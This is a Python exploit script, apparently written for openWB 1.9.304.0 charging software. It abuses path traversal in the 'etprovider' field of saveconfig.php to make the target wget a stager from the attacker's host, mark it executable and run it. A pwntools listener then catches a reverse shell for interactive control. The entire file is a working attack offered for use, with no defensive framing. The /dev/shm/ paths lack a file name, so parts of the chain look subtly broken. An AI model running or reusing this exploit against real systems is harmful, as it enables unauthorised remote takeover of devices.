import argparse
import threading
import http.server
import socketserver
from pwn import *
import requests
from urllib.parse import quote_plus

parser = argparse.ArgumentParser(description="Exploit to execute arbitrary commands on openWB version 1.9.304.0.")
parser.add_argument("url", help="The target URL")
parser.add_argument("listen_host", help="The listening host for downloading the script")
parser.add_argument("--lport", default=9001, type=int, help="The listening port to catch a reverse shell (default: 9001)")
parser.add_argument("--srvport", default=8000, type=int, help="The port for the HTTP server to serve the stager script (default: 8000)")
parser.add_argument("--exec_script", required=True, help="Path to the stager script that will be executed on openWB server")
parser.add_argument("--debug", action='store_true', help="Debug Mode for exploit development.")
parser.add_argument("--proxy", help="Proxy address (http://127.0.0.1:8080) for sending requests through Burp Suite", default=None)
args = parser.parse_args()

if args.debug:
    context.log_level = 'debug'
else:
    context.log_level = 'info'

def custom_http_server(exec_script, port):
    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            if self.path == '/stager':
                try:
                    with open(exec_script, 'rb') as f:
                        self.send_response(200)
                        self.send_header('Content-type', 'application/octet-stream')
                        self.end_headers()
                        self.wfile.write(f.read())
                except FileNotFoundError:
                    self.send_response(404)
                    self.end_headers()
                    self.wfile.write(b'File not found')
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b'Not found')

    with socketserver.TCPServer(("", port), RequestHandler) as httpd:
        log.info(f"Serving file {exec_script} on port {port} under /stager")
        httpd.serve_forever()

def start_http_server(port, exec_script):
    server_thread = threading.Thread(target=custom_http_server, args=(exec_script, port), daemon=True)
    server_thread.start()
    return server_thread

def send_payload(url, payload):
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
    proxies = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    response = requests.post(url, data=payload, headers=headers, proxies=proxies)
    log.debug(f"Payload sent. Status code: {response.status_code}")

def main():
    http_server = start_http_server(args.srvport, args.exec_script)

    try:
        listener = listen(args.lport)
        log.info(f"Listening for reverse shell on port {args.lport}.")
        sleep(1)
        log.debug("Waiting for an incoming connection.")
        
        
        log.info("Triggering stager download.")
        wget_command = quote_plus(f"../../../../../../bin/wget http://{args.listen_host}:{args.srvport}/stager -O /dev/shm/")
        sleep(1)
        log.info("Setting executable flag on downloaded stager.")
        chmod_command = quote_plus("chmod +x /dev/shm/")
        sleep(1)
        log.info("Executing downloaded stager.")
        execute_command = quote_plus("/dev/shm/")

        download_payload = f"etprovideraktiv=1&etprovider={wget_command}"
        make_executable_payload = f"etprovideraktiv=1&etprovider=../../../../../../usr/bin/{chmod_command}"
        execute_payload = f"etprovideraktiv=1&etprovider=../../../../../../{execute_command}"

        full_url = f"{args.url}/openWB/web/settings/saveconfig.php"
        send_payload(full_url, download_payload)
        send_payload(full_url, make_executable_payload)
        send_payload(full_url, execute_payload)

        conn = listener.wait_for_connection()
        
        log.debug("Received a connection.")

        log.info("Reverse Shell connected! Dropping into interactive mode.")
        conn.interactive()
    except PwnlibException as e:
        log.error(f"An error occurred: {e}")
    except KeyboardInterrupt:
        log.info("Execution stopped.")
    finally:
        http_server.join()
        if 'listener' in locals() and listener.connected():
            listener.close()
            log.debug("Listener closed.")

if __name__ == "__main__":
    main()
